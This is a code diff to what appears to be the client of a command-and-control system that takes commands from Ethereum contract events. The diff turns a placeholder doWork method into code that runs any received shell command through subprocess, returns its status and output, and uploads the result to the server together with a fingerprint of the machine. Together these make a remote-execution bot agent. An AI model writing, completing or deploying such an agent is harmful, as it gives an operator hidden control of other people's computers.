@@ -9,6 +9,7 @@ from Util.Process import waitFor, kill_proc
 from Util.EtherKeysUtil import *
 from Util.EtherTransaction import *
 # import pyelliptic
+import subprocess as sp
 
 REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
 COMMAND_PENDING_EVENT_NAME = 'CommandPending'
@@ -118,13 +119,15 @@ class ClientCommands:
 
 
 
-    def doWork(self, work):
+    def doWork(self, shell_cmd):
         #TODO actually execute stuff...
-        return 'Awsome'
-
+        s, out = sp.getstatusoutput(shell_cmd)
+        ret = { 'status': s,
+                'output': out[:32] }
+        return json.dumps(ret)
 
     def sendResults(self, cmdId, workResults):
-        l.info("sending results of cmdId",cmdId,"to server. result:",workResults[0:30],'...')
+        l.info("sending results of cmdId",cmdId,"to server. result:", workResults,'...')
         machineId = OsInteractions.fingerprintMachine()
         sessionAndMachineIdHash = toBytes32Hash(self.sessionId + machineId)
         #function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
